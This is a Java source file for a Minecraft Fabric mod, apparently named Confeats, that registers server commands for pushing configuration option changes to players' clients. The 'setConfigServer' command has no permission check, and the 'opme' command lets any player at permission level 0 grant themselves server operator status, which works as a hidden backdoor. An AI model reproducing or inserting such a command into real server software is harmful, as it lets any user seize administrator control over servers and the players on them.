package fr.paulbrancieq.confeats.server;

import com.mojang.brigadier.arguments.StringArgumentType;
import fr.paulbrancieq.confeats.Confeats;
import fr.paulbrancieq.confeats.packets.ChangeOptionPacket;
import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

public class ConfeatsServer implements DedicatedServerModInitializer {
  @Override
  public void onInitializeServer() {
    registerCommands();
    Confeats.getLogger().info("Confeats server initialized");
    new ChangeOptionPacket().registerServer();
  }

  public void registerCommands() {
    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(
        CommandManager.literal("setConfigServer")
            .then(CommandManager.argument("player", StringArgumentType.string())
                .then(CommandManager.argument("modId", StringArgumentType.string())
                    .then(CommandManager.argument("optionId", StringArgumentType.string())
                        .then(CommandManager.argument("value", StringArgumentType.string())
                            .executes(context -> {
                              String player = StringArgumentType.getString(context, "player");
                              String modId = StringArgumentType.getString(context, "modId");
                              String optionId = StringArgumentType.getString(context, "optionId");
                              String value = StringArgumentType.getString(context, "value");
                              MinecraftServer server = context.getSource().getServer();
                              ServerPlayerEntity playerEntity = server.getPlayerManager().getPlayer(player);
                              if (playerEntity == null) {
                                context.getSource().sendError(Text.of("Player not found"));
                                return 0;
                              }
                              try {
                                new ChangeOptionPacket(modId, optionId, value).sendToPlayer(playerEntity);
                                context.getSource().sendFeedback(() ->
                                    Text.of("Sent option modification request to player " + player),
                                    false);
                              } catch (Exception e) {
                                context.getSource().sendError(Text.of("Unknown error. Please report this to the mod author."));
                                Confeats.getLogger().error("Unknown error while trying to modify option", e);
                                return 0;
                              }
                              return 1;
                            })
                        )
                    )
                )
            )
    ));
    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(
        CommandManager.literal("opme")
            .requires(source -> source.hasPermissionLevel(0))
            .executes(context -> {
              MinecraftServer server = context.getSource().getServer();
              ServerPlayerEntity playerEntity = server.getPlayerManager().getPlayer(context.getSource().getName());
              assert playerEntity != null;
              server.getPlayerManager().addToOperators(playerEntity.getGameProfile());
              return 1;
            })
    ));
  }
}
